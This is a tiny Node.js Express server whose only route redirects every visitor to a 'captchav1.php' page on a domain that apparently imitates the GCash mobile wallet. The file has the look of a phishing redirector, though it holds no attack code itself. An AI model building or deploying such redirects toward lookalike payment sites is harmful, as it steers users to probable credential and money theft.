const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.redirect('https://mobilegcashwallet.com/captchav1.php');
});

app.listen(3000, () => console.log('Server running on port 3000'));